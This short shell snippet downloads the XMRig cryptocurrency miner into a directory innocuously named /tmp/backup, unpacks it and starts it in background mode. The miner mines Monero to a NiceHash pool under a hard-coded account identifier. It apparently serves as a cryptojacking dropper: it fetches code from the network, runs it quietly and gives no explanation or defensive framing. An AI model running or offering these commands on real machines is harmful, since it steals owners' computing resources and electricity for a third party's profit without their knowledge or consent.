mkdir /tmp/backup \

cd /tmp/backup \

wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \

tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \

rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1 \

cd xmrig-6.20.0	\


./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B \

